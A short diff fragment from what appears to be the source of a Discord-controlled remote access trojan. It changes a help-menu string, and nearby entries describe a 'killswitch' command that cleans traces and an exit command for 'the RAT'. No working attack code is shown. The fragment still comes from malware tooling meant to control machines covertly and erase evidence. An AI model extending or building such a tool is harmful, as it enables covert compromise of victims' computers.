@@ -2670,7 +2670,7 @@ async def help_cmd(ctx):
             "`killswitch` - Clean traces and exit"
         ],
         "🤖 Bot": [
-            "`exit` - Closes the RAT and exits"
+            "`exit` - EXITS"
         ]
     }
     
